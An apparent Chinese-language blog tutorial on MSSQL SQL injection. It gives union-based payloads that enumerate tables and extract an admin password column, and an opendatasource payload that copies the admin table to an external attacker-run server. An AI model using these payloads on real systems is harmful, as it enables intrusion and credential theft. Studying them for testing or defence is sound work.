<!DOCTYPE html>
<html lang="zh">
	<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="renderer" content="webkit">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>
        Hu5k7&#39;s Blog
    </title>
    <link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
    <link rel="stylesheet" href="/css/style.css">

</head>
<body id="bodyx">
    <div class="hd posts">
    <a href="/index.html"><i class="fa fa-reply replay-btn" aria-hidden="true"></i></a>
    <div class="post-title">
        <p>
            MSSQL Injection
        </p>
        <hr>
    </div>
    <div class="post-content">
        <h1 id="0x01-显错注入🔥">0x01 显错注入🔥</h1>
<p>union all select db_name() 	 	//查询当前库名<br>
union all select null,null,null from dbo.sysobjects 	//查询表<br>
union all select null,null,null from dbo.syscolumns		//查询字段</p>
<hr>
<p>?id=1 union all select id,name,null from dbo.sysobjects where xtype=‘U’</p>
<ul>
<li>⏫id 和 name 是系统自带的字段名。查询完需要记住，你要查询的表ID。xtype='U’是指用户创建的表</li>
</ul>
<p><img src="2.jpg" alt="1"></p>
<p>?id=1 union all select null,name,null from dbo.syscolumns where id=xxxxxx</p>
<ul>
<li>
<p>⏫ null是指3个字段。mssql里的字符串类型管理严格，有可能一个是int类型。或者str类型等。</p>
<p><img src="3.jpg" alt="2"></p>
</li>
</ul>
<p>?id=1 union all select null,password,null from admin</p>
<p><img src="4.jpg" alt="3"></p>
<h1 id="0x02-MSSQL-反弹注入🎈">0x02 MSSQL 反弹注入🎈</h1>
<ul>
<li><strong>前言</strong>:</li>
</ul>
<p>这个是一个比较骚的操作。针对无回显注入点的时候。</p>
<h2 id="0x02-1-反弹注入原理">0x02.1 反弹注入原理</h2>
<ul>
<li>☂️MSSQL注射攻击是最为复杂的数据库攻击技术，由于该数据库功能十分强大，存储过程以及函数语句十分丰富，这些灵活的语句造就了新颖的攻击思路，而反弹注入技术需要依靠opendatasource函数支持</li>
</ul>
<h2 id="0x02-2-反弹注入条件">0x02.2 反弹注入条件</h2>
<ul>
<li>🌐需要一台外网主机，字段要相同</li>
</ul>
<h3 id="复现">复现</h3>
<ul>
<li>Payload🔫</li>
</ul>
<p>insert into opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p>
<ul>
<li>句子理解</li>
</ul>
<p>opendatasource(‘sqloledb’,‘server=IP,1433;uid=USERNAME;pwd=PASSWORD;database=DATABASE’).DATABASE.dbo.TABLES select *from admin</p>
<ul>
<li>建立temp表4个字段</li>
</ul>
<p>create table temp(a varchar(255), b varchar(255),c varchar(255),d varchar(255))</p>
<ul>
<li>插入语句后查询</li>
</ul>
<p><img src="6.jpg" alt="6"></p>

    </div>
    
        <hr class="fhr">
        <div id="vcomments"></div>
    
</div>
    <div class="footer" id="footer">
    <p>Copyright © 2020  Hexo-Hijack.
        <label class="el-switch el-switch-green el-switch-sm" style="vertical-align: sub;">
            <input type="checkbox" name="switch" id="update_style">
            <span class="el-switch-style"></span>
            
        </label>
    </p>
</div>
<input type="hidden" id="web_style" value="black">


<script src="/libs/jquery.min.js"></script>
<script src="/libs/highlight/highlight.pack.js"></script>
<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
<script src="/js/js.js"></script>
<style type="text/css">
.v * {
    color: #698fca;
}

.v .vlist .vcard .vhead .vsys {
    color: #3a3e4a;
}

.v .vlist .vcard .vh .vmeta .vat {
    color: #638fd5;
}

.v .vlist .vcard .vhead .vnick {
    color: #6ba1ff;
}

.v a {
    color: #8696b1;
}

.v .vlist .vcard .vhead .vnick:hover {
    color: #669bfc;
}
</style>
</body>

</html>